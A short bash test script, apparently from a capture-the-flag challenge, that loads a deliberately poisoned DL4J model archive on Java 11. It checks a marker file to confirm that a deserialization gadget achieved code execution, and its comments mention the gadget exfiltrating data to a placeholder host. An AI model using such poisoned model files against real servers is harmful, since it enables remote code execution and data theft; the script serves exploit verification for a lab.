#!/bin/bash
# pinned-JDK container (temurin-11): load the poisoned model exactly like the server.
# Stock JVM, no flags — proves the DL4J-scoped gadget needs nothing special on Java 11.
set -u
java -version 2>&1 | head -1
rm -f /tmp/.sig_ran
CP="/payload/target/classes:$(cat /work/cp.txt)"
# Gadget network-exfils to the baked placeholder; offline the /tmp/.sig_ran marker
# proves the translet ctor ran. Full exfil is verified by htb/solver.py live.
java -cp "$CP" local.poc.VictimLoad /work/out/model-rce.zip 2>&1 | grep -vE "^SLF4J" | tail -8
echo "--- signals ---"
[ -f /tmp/.sig_ran ] && echo "CTOR_RAN: yes  <-- RCE OK (translet ctor executed)" || echo "CTOR_RAN: no"
